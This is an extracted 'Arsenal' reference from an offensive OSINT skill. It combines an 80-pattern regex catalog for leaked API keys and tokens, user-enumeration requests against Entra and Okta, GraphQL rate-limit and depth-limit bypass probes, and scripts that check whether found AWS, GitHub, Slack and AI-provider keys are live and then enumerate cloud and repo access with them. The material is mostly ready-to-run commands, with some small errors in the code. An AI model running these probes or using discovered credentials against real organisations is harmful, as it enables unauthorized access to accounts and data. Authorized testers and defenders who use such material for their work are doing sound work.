# Offensive-OSINT — Arsenal

> Extracted from `SKILL.md` on 2026-09-26. Heading numbering preserved; section references in the main skill point here.

## 17. Secret-Pattern Catalog — 80 patterns (29 base + 19 modern + 32 provider expansion)

The catalog runs against any text source: GitHub code, Postman workspaces, JS bodies, sourcesContent blobs, mobile-app strings, Wayback HTML, paste sites, Stack Exchange code blocks. **Order matters: most-specific patterns first** so generic catches don't pre-empt typed ones.

| # | Name | Regex | Severity | Category |
|---|---|---|---|---|
| 1 | AWS Access Key | `\b(AKIA\|ASIA)[0-9A-Z]{16}\b` | **CRITICAL** | aws |
| 2 | AWS Secret Key (typed) | `(?i)aws[_\-]?secret[_\-]?access[_\-]?key['"\s:=]+([A-Za-z0-9/+=]{40})` | **CRITICAL** | aws |
| 3 | AWS Secret (loose) | `(?i)aws(.{0,20})?(secret\|sk)["'=: ]+([0-9a-z/+=]{40})` | HIGH | aws |
| 4 | GCP Service Account JSON | `"type"\s*:\s*"service_account"` | **CRITICAL** | gcp |
| 5 | Google API Key | `\bAIza[0-9A-Za-z_\-]{35}\b` | HIGH | gcp |
| 6 | GitHub Classic PAT | `\bghp_[A-Za-z0-9]{36}\b` | **CRITICAL** | github |
| 7 | GitHub Fine-grained PAT | `\bgithub_pat_[A-Za-z0-9_]{82}\b` | **CRITICAL** | github |
| 8 | GitHub OAuth | `\bgho_[A-Za-z0-9]{36}\b` | HIGH | github |
| 9 | GitHub Server-to-Server | `\bgh[usr]_[A-Za-z0-9]{36,}\b` | HIGH | github |
| 10 | Stripe Live Key | `\bsk_live_[0-9A-Za-z]{24,}\b` | **CRITICAL** | stripe |
| 11 | Stripe Test Key | `\bsk_test_[0-9A-Za-z]{24,}\b` | LOW | stripe |
| 12 | Slack Token | `\bxox[abpors]-[0-9A-Za-z\-]{10,48}\b` | HIGH | slack |
| 13 | Slack Webhook | `https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+` | MEDIUM | slack |
| 14 | SendGrid Key | `\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b` | HIGH | email_svc |
| 15 | Mailgun Key (v1) | `\bkey-[0-9a-zA-Z]{32}\b` | HIGH | email_svc |
| 16 | Mailgun Key (loose) | `\bkey-[0-9a-f]{32}\b` | HIGH | email_svc |
| 17 | Twilio API Key | `\bSK[0-9a-fA-F]{32}\b` | HIGH | twilio |
| 18 | Twilio Account SID | `\bAC[a-f0-9]{32}\b` | MEDIUM | twilio |
| 19 | Twilio Auth Token | `(?i)twilio(.{0,20})?(auth\|token)["'=: ]+([a-f0-9]{32})` | HIGH | twilio |
| 20 | Heroku API Key | `(?i)heroku(.{0,20})?api["'=: ]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})` | MEDIUM | paas |
| 21 | Firebase URL | `\bhttps?://[a-z0-9\-]+\.firebaseio\.com\b` | LOW | firebase |
| 22 | JWT (any) | `\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b` | MEDIUM | jwt |
| 23 | Bearer Token Assignment | `(?i)authorization["'=: ]+bearer\s+[A-Za-z0-9._\-]{20,}` | MEDIUM | bearer |
| 24 | Basic Auth in URL | `https?://[^/\s:@]+:[^/\s:@]+@[^/\s]+` | MEDIUM | basic_auth |
| 25 | RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` | **CRITICAL** | private_key |
| 26 | EC Private Key | `-----BEGIN EC PRIVATE KEY-----` | **CRITICAL** | private_key |
| 27 | OpenSSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` | **CRITICAL** | private_key |
| 28 | Generic Private Key | `-----BEGIN (DSA \|PGP \|)PRIVATE KEY-----` | **CRITICAL** | private_key |
| 29 | Generic API Key | `(?i)(?:api[_\-]?key\|apikey\|api_secret\|access_token\|secret[_\-]?token)['"\s:=]+["']([A-Za-z0-9+/=_\-]{24,})["']` | MEDIUM | generic |
| 30 | Anthropic API Key | `\bsk-ant-(?:api03\|admin01)-[A-Za-z0-9_\-]{93,}\b` | **CRITICAL** | ai_api |
| 31 | OpenAI API Key (legacy) | `\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b` | **CRITICAL** | ai_api |
| 32 | OpenAI Project Key | `\bsk-proj-[A-Za-z0-9_\-]{40,}T3BlbkFJ[A-Za-z0-9_\-]{40,}\b` | **CRITICAL** | ai_api |
| 33 | OpenAI User Session | `\bsess-[A-Za-z0-9]{40}\b` | HIGH | ai_api |
| 34 | HuggingFace Token | `\bhf_[A-Za-z0-9]{30,}\b` | HIGH | ai_api |
| 35 | Cloudflare API Token | `\b[A-Za-z0-9_\-]{40}\b` (when paired with `(?i)cloudflare`/`X-Auth-Key` context) | HIGH | infra_api |
| 36 | Cloudflare Global API Key | `(?i)cf[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{37})` | **CRITICAL** | infra_api |
| 37 | DigitalOcean Token | `\bdop_v1_[a-f0-9]{64}\b` | HIGH | infra_api |
| 38 | npm Token (Modern) | `\bnpm_[A-Za-z0-9]{36}\b` | HIGH | package_registry |
| 39 | PyPI Token | `\bpypi-AgENdGV[A-Za-z0-9_\-]+\b` | HIGH | package_registry |
| 40 | Docker Hub PAT | `\bdckr_pat_[A-Za-z0-9_\-]{27,}\b` | HIGH | package_registry |
| 41 | Atlassian API Token | `\bATATT3xFfGF0[A-Za-z0-9_\-]{180,}\b` | HIGH | saas_api |
| 42 | New Relic License Key | `\b(?:NRAA\|NRAK\|NRBR)-[A-F0-9]{27}\b` | MEDIUM | observability |
| 43 | DataDog API Key (in DD_API_KEY context) | `(?i)dd[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{32})` | HIGH | observability |
| 44 | Sentry DSN | `https://[a-f0-9]+@o[0-9]+\.ingest\.sentry\.io/[0-9]+` | LOW | observability |
| 45 | ngrok Auth Token | `\b[12][A-Za-z0-9]{26}_[A-Za-z0-9]{32,}\b` (when `(?i)ngrok` context) | MEDIUM | tunneling |
| 46 | Linear API Key | `\blin_api_[A-Za-z0-9]{40}\b` | MEDIUM | saas_api |
| 47 | Discord Bot Token | `\b[MN][A-Za-z\d]{23}\.[\w\-]{6}\.[\w\-]{27}\b` | HIGH | bot_token |
| 48 | Telegram Bot Token | `\b\d{8,10}:[A-Za-z0-9_\-]{35}\b` | HIGH | bot_token |

**Provider expansion (v2.2, #49–80).** Row 49 (Postman PMAK) is grounded directly in the reference implementation's `modules/secrets_beyond_github.py::_RE_PMAK` — a real gap, since §23.1 already documents the PMAK *validator* but the catalog never had the detection regex. Rows 50–80 add well-known, distinctive-prefix or context-anchored token formats for providers not covered by rows 1–48, in the same reliability bar: standalone only where the vendor's own prefix is distinctive enough to not collide (`glpat-`, `sq0atp-`, `shpat_`, `dapi`, `.atlasv1.`, `GOCSPX-`, `ya29.`, `EAA`, `rubygems_`, `AKCp`, `SSWS `, `xapp-1-`, `sl.`, `dp.pt.`, `hvs.`, `AAAA…:`), context-anchored (mirroring the §17 #35 Cloudflare approach) everywhere the vendor's own token has no fixed shape (PagerDuty, Asana, Fastly, Algolia, Segment, legacy Airtable key, Azure/Entra client secret, Okta generic token).

| # | Name | Regex | Severity | Category |
|---|---|---|---|---|
| 49 | Postman API Key (PMAK) | `\bPMAK-[A-Za-z0-9]{24,64}\b` | **CRITICAL** | postman |
| 50 | GitLab Personal Access Token | `\bglpat-[A-Za-z0-9_\-]{20}\b` | HIGH | gitlab |
| 51 | Square Access Token | `\bsq0atp-[0-9A-Za-z\-_]{22}\b` | **CRITICAL** | square |
| 52 | Square OAuth Secret | `\bsq0csp-[0-9A-Za-z\-_]{43}\b` | HIGH | square |
| 53 | Shopify Access Token | `\bshpat_[a-fA-F0-9]{32}\b` | HIGH | shopify |
| 54 | Shopify Shared Secret | `\bshpss_[a-fA-F0-9]{32}\b` | HIGH | shopify |
| 55 | Mailchimp API Key | `\b[0-9a-f]{32}-us[0-9]{1,2}\b` | HIGH | email_svc |
| 56 | PagerDuty API Key | `(?i)pagerduty(.{0,20})?(api\|token\|key)['"\s:=]+([A-Za-z0-9+_\-]{20,32})` | MEDIUM | saas_api |
| 57 | Asana Personal Access Token | `(?i)asana(.{0,20})?(token\|pat)['"\s:=]+([0-9]{1,10}/[0-9]{10,20}:[a-f0-9]{32})` | MEDIUM | saas_api |
| 58 | Databricks Personal Access Token | `\bdapi[0-9a-f]{32}(?:-\d)?\b` | HIGH | saas_api |
| 59 | Grafana API Key (legacy) | `\beyJrIjoi[A-Za-z0-9+/=]{40,}\b` | MEDIUM | observability |
| 60 | Grafana Cloud Access Policy Token | `\bglc_[A-Za-z0-9+/]{32,}={0,2}\b` | MEDIUM | observability |
| 61 | Terraform Cloud/Enterprise Token | `\b[A-Za-z0-9]{14}\.atlasv1\.[A-Za-z0-9_\-=]{60,70}\b` | **CRITICAL** | infra_api |
| 62 | Fastly API Token | `(?i)fastly(.{0,20})?(api\|token)['"\s:=]+([A-Za-z0-9_\-]{32})` | HIGH | infra_api |
| 63 | Algolia Admin API Key | `(?i)algolia(.{0,20})?(admin\|api)[_\-]?key['"\s:=]+([A-Za-z0-9]{32})` | HIGH | saas_api |
| 64 | Segment Write Key | `(?i)segment(.{0,20})?(write)?[_\-]?key['"\s:=]+([A-Za-z0-9]{20,32})` | LOW | saas_api |
| 65 | Airtable API Key (legacy) | `(?i)airtable(.{0,20})?(api)?[_\-]?key['"\s:=]+(key[A-Za-z0-9]{14})` | MEDIUM | saas_api |
| 66 | Airtable Personal Access Token | `\bpat[A-Za-z0-9]{14}\.[a-f0-9]{64}\b` | HIGH | saas_api |
| 67 | GCP OAuth Client Secret | `\bGOCSPX-[A-Za-z0-9_\-]{28}\b` | HIGH | gcp |
| 68 | Google OAuth Access Token | `\bya29\.[0-9A-Za-z_\-]{20,}\b` | HIGH | gcp |
| 69 | Google OAuth Client ID | `\b[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com\b` | LOW | gcp |
| 70 | Azure AD / Entra Client Secret | `(?i)(?:azure\|entra)[_\-]?(?:client\|app)[_\-]?secret['"\s:=]+([A-Za-z0-9_~.\-]{34,40})` | HIGH | azure |
| 71 | Facebook Graph API Access Token | `\bEAA[A-Za-z0-9]{90,}\b` | HIGH | oauth |
| 72 | RubyGems API Key | `\brubygems_[a-f0-9]{48}\b` | HIGH | package_registry |
| 73 | JFrog Artifactory API Key | `\bAKCp[A-Za-z0-9]{50,70}\b` | HIGH | infra_api |
| 74 | Okta SSWS Token | `\bSSWS\s+[0-9a-zA-Z_\-]{40}\b` | **CRITICAL** | identity |
| 75 | Okta API Token | `(?i)okta(.{0,20})?(api)?[_\-]?token['"\s:=]+([0-9a-zA-Z_\-]{40})` | HIGH | identity |
| 76 | Slack App-Level Token | `\bxapp-1-[A-Za-z0-9\-]{20,}\b` | HIGH | slack |
| 77 | Dropbox Short-Lived Token | `\bsl\.[A-Za-z0-9_\-]{130,140}\b` | MEDIUM | oauth |
| 78 | Doppler Personal Token | `\bdp\.pt\.[A-Za-z0-9]{40,44}\b` | **CRITICAL** | secrets_mgmt |
| 79 | HashiCorp Vault Token | `\bhvs\.[A-Za-z0-9_\-]{90,100}\b` | **CRITICAL** | secrets_mgmt |
| 80 | Firebase Cloud Messaging Server Key (legacy) | `\bAAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140,}\b` | HIGH | firebase |

**False-positive notes:**

- Patterns 22 (JWT), 23 (Bearer), 29 (Generic) trigger on test/example data frequently. Always look at *context* — a JWT in a `README.md` example block ≠ a JWT in a production `.env` file.
- Pattern 16 (Mailgun loose) and pattern 11 (Stripe test) are noisy by design; severity is set low for that reason.
- Pattern 24 (Basic auth in URL) catches monitoring-tool URLs and CI-debug URLs as well as real creds — verify before alerting.
- For GitHub's Fine-grained PAT (pattern 7), the `82` length is by GitHub's spec — be skeptical of matches significantly longer or shorter.
- Patterns 56 (PagerDuty), 57 (Asana), 62 (Fastly), 63 (Algolia), 64 (Segment), 65 (Airtable legacy), 70 (Azure/Entra), 75 (Okta generic) are context-anchored because the vendor token itself has no fixed shape — same discipline as pattern 35 (Cloudflare). A hit means "provider name + key-shaped value on the same line," not a cryptographically distinctive match; verify before escalating.
- Pattern 59 (Grafana legacy) and 60 (Grafana Cloud) can both fire on the same key in older self-hosted instances that still mint `eyJrIjoi…`-style tokens even under a Cloud-flavored URL — treat as one finding, not two.
- Pattern 69 (Google OAuth Client ID) is LOW by design: a client ID is a public identifier by OAuth spec, not a secret — the finding is config/tenant disclosure, not credential exposure. Don't escalate without a paired client secret (pattern 67) or refresh token.
- Pattern 80 (FCM Server Key) enables push-notification injection to every installed instance of the app (phishing/malware push at scale), not data read — cross-reference §21.1 for the mobile-static-analysis context this typically surfaces in.

---


## 22. Identity Fabric — Concrete Endpoints

Methodology lives in the companion `osint-methodology` skill §11. This is the URL/payload reference.

### 22.1 Microsoft Entra (Azure AD)

**OIDC metadata + tenant GUID extraction:**

```
GET https://login.microsoftonline.com/{tenant-or-domain}/.well-known/openid-configuration
```

Response field `issuer` contains the tenant GUID. GUID regex:

```regex
\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b
```

Detectability: low.

**getuserrealm.srf — managed vs federated probe:**

```
GET https://login.microsoftonline.com/getuserrealm.srf?login=<probe-user>@<domain>
```

Response: JSON with `NameSpaceType` field (`Managed` / `Federated` / `Unknown`). Federated also includes `FederationBrandName` and `AuthURL` (the upstream IdP URL). Detectability: low.

**Autodiscover v2:**

```
POST https://autodiscover-s.outlook.com/autodiscover/metadata/json/1
Body: {"Email": "<probe-user>@<domain>"}
```

Returns the protocol endpoint for the user; presence indicates tenant membership. Detectability: low.

**Autodiscover IP correlation (passive M365 confirmation):**

Resolve `autodiscover.<domain>` and check if it lands in Microsoft Exchange Online IP space. This works even when MX is wrapped by Mimecast/Proofpoint/Barracuda inbound filtering, where MX alone doesn't reveal the underlying mail platform.

```bash
dig +short A autodiscover.target.example
```

```powershell
Resolve-DnsName "autodiscover.$D" -Type A | Select Name,IPAddress
```

Microsoft Exchange Online IPs (truncated common ranges): `40.96.0.0/13`, `52.96.0.0/14`, `13.107.6.152/31`, `13.107.18.10/31`, `40.99.0.0/16`, `40.104.0.0/15`, `52.98.0.0/15`. Full list: [Office 365 URLs and IP address ranges](https://learn.microsoft.com/en-us/microsoft-365/enterprise/urls-and-ip-address-ranges).

If `autodiscover.<domain>` lands in that space → `M365_CONFIRMED` even when nothing else does. Detectability: low (passive DNS).

**GetCredentialType — user-enum (deep mode only):**

```
POST https://login.microsoftonline.com/common/GetCredentialType
Content-Type: application/json
Body:
{
 "username": "<email>",
 "isOtherIdpSupported": true,
 "checkPhones": false,
 "isRemoteNGCSupported": true,
 "isCookieBannerShown": false,
 "isFidoSupported": true,
 "originalRequest": "",
 "country": "US",
 "forceotclogin": false,
 "isExternalFederationDisallowed": false,
 "isRemoteConnectSupported": false,
 "federationFlags": 0
}
```

Response field `IfExistsResult` indicates user existence: `0` = exists, `1` = doesn't exist, `5` = exists in federated tenant. Detectability: medium (logged in tenant audit). Cap at 20 attempts per tenant.

### 22.2 Okta

**Org slug derivation:** start with stems from discovered subdomains and root-domain stem. Probe `<slug>.okta.com` and `<slug>.oktapreview.com`. Slug regex:

```regex
[a-z0-9][a-z0-9-]{1,40}\.okta(?:preview)?\.com
```

**OIDC fingerprint:**

```
GET https://<slug>.okta.com/.well-known/openid-configuration
```

**/api/v1/authn user-enum (deep mode):**

```
POST https://<slug>.okta.com/api/v1/authn
Content-Type: application/json
Body: {"username": "<email>", "password": "invalid_password_for_enum"}
```

Response distinguishes user existence:

- `400` with `errorCode: E0000004` → user doesn't exist (or generic password error in some configs).
- `401` with `status: PASSWORD_WARN` / `LOCKED_OUT` / `MFA_REQUIRED` → user exists.
Detectability: medium (audit-log per attempt). Cap at 20 attempts per tenant.

### 22.3 ADFS

**Passive fingerprint:**

```
GET https://{domain}/adfs/idpinitiatedsignon.aspx
```

A `200 OK` with a `urn:com:microsoft:ADFS:` reference in HTML indicates ADFS. Version-string greppable in HTML resource references.

**Mex endpoint (deep mode):**

```
GET https://{domain}/adfs/Services/Trust/mex
```

Returns SOAP federation metadata including endpoint URLs, signing certs, and supported claim types.

### 22.4 Google Workspace

**OIDC discovery:**

```
GET https://{domain}/.well-known/openid-configuration
```

Google-Workspace-hosted-domain customers expose discovery endpoints with characteristic `issuer` URI (`https://accounts.google.com`) and JWKS URI. MX records pointing to `aspmx.l.google.com` are a corroborating signal.

### 22.5 Generic OIDC (Keycloak / Auth0 / Ping / OneLogin / Duo)

**Discovery:** probe `/.well-known/openid-configuration` on every alive subdomain. The `issuer` and `authorization_endpoint` field URLs fingerprint the product:

| Product | URL pattern in `issuer` |
|---|---|
| Auth0 | `https://*.auth0.com` |
| OneLogin | `https://*.onelogin.com` |
| Ping | `https://*.pingone.com`, `https://*.pingidentity.com` |
| Duo | `https://*.duosecurity.com` |
| Keycloak | URL contains `/realms/<realm>` |
| OneLogin | `https://*.onelogin.com` |

### 22.6 SAML metadata

See §16.6.

### 22.7 AWS account-ID extraction

**S3 bucket region header (passive):**

```
HEAD https://<known-bucket>.s3.amazonaws.com/
```

Response includes `x-amz-bucket-region`. Cross-reference with bucket name entropy and known patterns to scope the account.

**ARN regex (in any JSON / HTML / JS response):**

```regex
arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:([0-9]{12}):
```

Capture group: 12-digit AWS account ID.

**`AccountId` property pattern:**

```regex
(?i)["']?account[_\-]?id["']?\s*[:=]\s*["']([0-9]{12})["']
```

**Google OAuth client_id:**

```regex
\b\d{8,}-[a-z0-9]{10,40}\.apps\.googleusercontent\.com\b
```

**MSAL / Microsoft client_id (GUID property):**

```regex
(?i)["']?client[_\-]?id["']?\s*[:=]\s*["']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']
```

**OAuth scope extraction:**

```regex
(?i)["']?scope["']?\s*[:=]\s*["']([^"']+)["']
```

### 22.8 Microsoft 365 Deep Enumeration (Teams / SharePoint / OneDrive / OAuth)

**Teams federation status:**

```bash
# Resolve tenant first
curl -sk -m 10 "https://login.microsoftonline.com/${TARGET_DOMAIN}/.well-known/openid-configuration" | jq -r '.issuer'
# Federation API requires authenticated request from a federated tenant; presence of error pattern reveals fed status
curl -sk -m 10 "https://teams.microsoft.com/api/mt/emea/beta/users/<email>/externalsearchv3"
```

**SharePoint subdomain probe:**

```bash
STEM=$(echo $TARGET_DOMAIN | cut -d. -f1)
for sub in "" "-my" "-admin"; do
 echo "=== ${STEM}${sub}.sharepoint.com ==="
 curl -sk -m 10 -I "https://${STEM}${sub}.sharepoint.com/" -w '%{http_code}\n'
done
```

**Reading the result correctly:** `HTTP 200` from these probes means **the tenant exists** (Microsoft serves a generic redirect-to-auth page) — it does **NOT** mean anonymous access is granted to the tenant's content. Distinguish:

- 200 → tenant provisioned (INFO).
- 200 + redirect to a custom anonymous-share URL (`/sites/<x>/Lists/<y>/AllItems.aspx?guestaccesstoken=...`) discovered via dorks → HIGH (data exposure).
- 401/403 → tenant exists but auth required (INFO).
- 404 / NXDOMAIN → tenant not provisioned at this stem (or vanity-named — check known stems from cert transparency).

PowerShell:

```powershell
$STEM = ($D -split '\.')[0]
foreach ($s in @("","-my","-admin")) {
 try {
 $r = Invoke-WebRequest -Uri "https://${STEM}${s}.sharepoint.com/" -Method Head -UseBasicParsing -TimeoutSec 10
 "${STEM}${s}.sharepoint.com -> HTTP $($r.StatusCode) (tenant exists)"
 } catch {
 $code = $_.Exception.Response.StatusCode.value__
 if ($code) { "${STEM}${s}.sharepoint.com -> HTTP $code" } else { "${STEM}${s}.sharepoint.com -> no host" }
 }
}
```

**OneDrive personal site probe** (for a known email `alice@acme.com`):

```bash
USER_TOKEN=$(echo "alice@acme.com" | tr '@.' '__')
STEM="acme"
curl -sk -m 10 -I "https://${STEM}-my.sharepoint.com/personal/${USER_TOKEN}/Documents/" -w '%{http_code}\n'
# 401 = exists; 404 = not provisioned
```

**M365 OAuth client_id discovery in JS:**

```bash
curl -sk -m 10 "https://app.target.example/main.js" | \
 grep -oE 'clientId["'\''[:=]+ ?["'\'']?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
```

**Device-code phishing target check** (look for `device_authorization_endpoint` in OIDC metadata):

```bash
curl -sk -m 10 "https://login.microsoftonline.com/${TARGET_DOMAIN}/v2.0/.well-known/openid-configuration" | \
 jq '.device_authorization_endpoint'
```

If non-null and tenant doesn't restrict device-code: MEDIUM finding (device-code phishing feasible).

**Power Platform / Dynamics URLs to check:**

- `*.crm.dynamics.com` (per-region: `crm`, `crm2`-`crm15`, `crm.dynamics.com`).
- `*.api.crm.dynamics.com` (Web API).
- `make.powerapps.com` / `flow.microsoft.com` (auth-required dashboards).

**Severity:**

- Discovered SharePoint/OneDrive tenants → INFO (asset only).
- Anonymous SharePoint anonymous-share link → HIGH (data exposure).
- `device_authorization_endpoint` enabled on tenant → MEDIUM (operational risk).
- Multi-tenant OAuth app with broad Graph scopes published by target → HIGH.

### 22.9 GraphQL Field-Suggestion Enumeration (when introspection disabled)

When the standard introspection query (§16.2) returns `"errors":[{"message":"GraphQL introspection is disabled"}]`, fall back to field-suggestion enumeration. Apollo and most GraphQL libraries enable "did you mean" suggestions by default.

**Detection probe:**

```bash
curl -sk -m 10 -X POST "$T/graphql" \
 -H 'Content-Type: application/json' \
 -d '{"query":"{ __schema { types { name } } }"}' | jq -r '.errors[0].message'
# If "introspection disabled" → proceed.
```

**Field-suggestion probe** (intentionally typo a field name to trigger suggestions):

```bash
curl -sk -m 10 -X POST "$T/graphql" \
 -H 'Content-Type: application/json' \
 -d '{"query":"{ usre { id } }"}' | jq -r '.errors.message'
# Expected: "Cannot query field \"usre\" on type \"Query\". Did you mean \"user\", \"users\", \"userById\"?"
```

Iterate over a candidate-field wordlist (use SecLists `Discovery/Web-Content/graphql.txt` or `clairvoyance` library's seed list). Each suggestion reveals real field names. Continue until no new suggestions emerge.

**Tooling:**

- **Clairvoyance** (`pip install clairvoyance`) — automated field-suggestion enumerator. `clairvoyance -w wordlist.txt -o schema.json https://target.example/graphql`.
- **GraphQL-Cop** — auditor that probes for introspection, batching, depth-limit, suggestion config. `pip install graphql-cop`.
- **InQL** (Burp extension) — Burp Suite extension for GraphQL endpoint analysis.
- **GraphQL Voyager** — visualize once schema is reconstructed.

**Other GraphQL-when-introspection-disabled techniques:**

- **Alias-based query batching** (rate-limit / auth-bypass surface):

 ```json
 {
 "query": "{ a:user(id:1){name} b:user(id:2){name} c:user(id:3){name} ... }"
 }
 ```

 Many APIs rate-limit per-request, not per-alias. Test 100+ aliases per request.

- **Query-depth-limit bypass** (DoS / introspection bypass):

 ```json
 {
 "query": "{ user { friends { friends { friends { friends { id } } } } } }"
 }
 ```

 If server allows arbitrary depth → DoS surface; if depth-limited but doesn't strip nested `__type`/`__schema` → introspection-via-depth.

- **Subscription enumeration via WebSocket:**

 ```bash
 wscat -c "wss://target.example/graphql" -s graphql-ws
 > {"type":"connection_init"}
 > {"id":"1","type":"start","payload":{"query":"subscription { __schema { types { name } } }"}}
 ```

- **Batched query bypass** (some servers process all queries in batch even if first fails):

 ```json
 [
 {"query":"{ __schema { types { name } } }"},
 {"query":"{ user(id:1) { name } }"}
 ]
 ```

**Severity:**

- Field-suggestion enumeration succeeds (50+ fields recoverable) → MEDIUM `MISCONFIG`.
- Alias batching not rate-limited → MEDIUM (rate-limit-bypass surface).
- Subscription endpoint exposed without auth → MEDIUM (often used for real-time data exfil).

---


## 23. Read-Only Secret Validators

Use these to confirm a discovered credential is live. **Read-only, never destructive.** Tag every validation with `detectability` and `checked_at` (UTC).

### 23.1 Postman API Key (PMAK-*)

Detection regex: §17 #49 (`\bPMAK-[A-Za-z0-9]{24,64}\b`, CRITICAL). Validate a hit with:

```
GET https://api.getpostman.com/me
Header: X-Api-Key: PMAK-<key>
```

- `200` → live; response contains `{user: {id, username, email}}`.
- `401` → dead.
- Scope: full read access to the user's Postman account (collections, env vars, history).
- Detectability: low.

### 23.2 AWS Access Key

```
sts:GetCallerIdentity
```

Use boto3:

```python
import boto3
sts = boto3.client('sts',
 aws_access_key_id='<AKIA...>',
 aws_secret_access_key='<secret>',
 region_name='us-east-1')
ident = sts.get_caller_identity
# ident['Account'], ident['Arn'], ident['UserId']
```

- Valid → returns Account ID + ARN + UserId.
- Invalid → `InvalidClientTokenId` or `SignatureDoesNotMatch`.
- ARN scope: `:user/` is IAM user (broad), `:assumed-role/` is temp role (narrow), `:root` is account root (do NOT validate root keys you find).
- Detectability: **medium** (CloudTrail logs `GetCallerIdentity` in account `<found>`).

### 23.3 GitHub PAT

```
GET https://api.github.com/user
Header: Authorization: token <ghp_*>
```

- `200` → live; response contains `login`, `id`, `name`, `email` (if public).
- Response header `X-OAuth-Scopes` lists token scopes. `repo` scope = write to all accessible repos; `admin:org` = org admin.
- `401` → dead.
- Detectability: low.

### 23.4 Slack Token

```
POST https://slack.com/api/auth.test
Header: Authorization: Bearer <xox*-*>
```

- `200` with `{"ok": true}` → live; response includes `team`, `team_id`, `user`, `user_id`.
- `200` with `{"ok": false, "error": "invalid_auth"}` → dead.
- Detectability: low.

### 23.5 Anthropic API Key

```
GET https://api.anthropic.com/v1/models
Headers:
 x-api-key: sk-ant-api03-...
 anthropic-version: 2023-06-01
```

- `200` → live; response lists available models.
- `401` → dead.
- `403` with org_disabled → key valid but org disabled.
- Detectability: low; usage shows in Anthropic Console for the workspace owner.

### 23.6 OpenAI API Key

```
GET https://api.openai.com/v1/models
Header: Authorization: Bearer sk-...
```

- `200` → live; lists models (may include org-specific fine-tunes).
- `401` → dead.
- `429` → live but quota exhausted.
- Detectability: low; usage shows in OpenAI dashboard.

### 23.7 npm Token

```
GET https://registry.npmjs.org/-/whoami
Header: Authorization: Bearer npm_<token>
```

- `200` with `{"username": "<user>"}` → live.
- `401` → dead.
- For scope check: `GET /-/npm/v1/tokens` returns the token's permissions (read/publish).
- Detectability: low.

### 23.8 Atlassian API Token

```
GET https://<workspace>.atlassian.net/rest/api/3/myself
Auth: Basic <base64(email:ATATT3xFfGF0_...)>
```

- `200` → live; returns account profile + email.
- `401` → dead.
- Workspace required — extract from leaked repo URL or Atlassian dork results.
- Detectability: low.

### 23.9 DataDog API + APP Key

```
GET https://api.datadoghq.com/api/v1/validate
Headers:
 DD-API-KEY: <api-key>
 DD-APPLICATION-KEY: <app-key>
```

- `200` → both keys valid.
- `403` → either key invalid.
- Per-region URL varies: `api.datadoghq.eu`, `api.us3.datadoghq.com`, etc.
- Detectability: low; appears in DataDog audit log.

### 23.10 Validator output schema

```
{
 "status": "verified_live" | "verified_dead" | "scope_restricted" |
 "scope_unrestricted" | "validation_skipped_by_policy" |
 "validation_unsupported" | "validation_failed_transient",
 "provider": "postman" | "aws" | "github" | "slack" | "anthropic" | "openai" | "npm" | "atlassian" | "datadog",
 "account_id": "<opaque>",
 "scope": "<freeform>",
 "metadata": {<provider-specific>},
 "checked_at": "<UTC ISO8601>",
 "detectability": "low" | "medium" | "high"
}
```

### 23.11 Hard rules

- Read-only endpoint only.
- Never use the validated credential to create, modify, delete, or send anything.
- Tag every validation with detectability.
- Record `checked_at` (UTC).
- If RoE forbids validation → `validation_skipped_by_policy`, stop, document.
- For root AWS keys, infrastructure-write GitHub PATs, or admin Slack tokens — flag for the operator and let them decide.

### 23.12 Post-Discovery Enumeration Workflows

After validation confirms a key is live, you often want to enumerate what it can do. Stay read-only.

**AWS access key — IAM enum:**

```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# Identity (already done as part of validation)
aws sts get-caller-identity

# IAM-user details (only if ARN was :user/)
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text)

# What can I actually do? (simulate-principal-policy for common dangerous actions)
aws iam simulate-principal-policy \
 --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
 --action-names s3:ListAllMyBuckets ec2:DescribeInstances iam:ListUsers \
 secretsmanager:ListSecrets ssm:DescribeParameters \
 lambda:ListFunctions rds:DescribeDBInstances

# Read-only enumeration of common services (do not WRITE)
aws s3 ls
aws ec2 describe-instances --output table --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value]'
aws secretsmanager list-secrets --query 'SecretList[*].Name'
aws ssm describe-parameters --query 'Parameters[*].Name'
aws lambda list-functions --query 'Functions[*].FunctionName'
aws rds describe-db-instances --query 'DBInstances[*].DBInstanceIdentifier'

# CloudTrail check — is logging on?
aws cloudtrail describe-trails

# Check MFA enforcement on the user
aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled'
aws iam list-mfa-devices --user-name <username>
```

**GitHub PAT — repo enum:**

```bash
TOKEN="ghp_..."
H="Authorization: token $TOKEN"

# Scopes already captured from X-OAuth-Scopes header
curl -sk -m 10 -I -H "$H" https://api.github.com/user | grep -i 'X-OAuth-Scopes'

# All repos accessible (own + collaborator + org member)
curl -sk -m 10 -H "$H" "https://api.github.com/user/repos?affiliation=owner,collaborator,organization_member&per_page=100"

# Org memberships
curl -sk -m 10 -H "$H" "https://api.github.com/user/orgs"

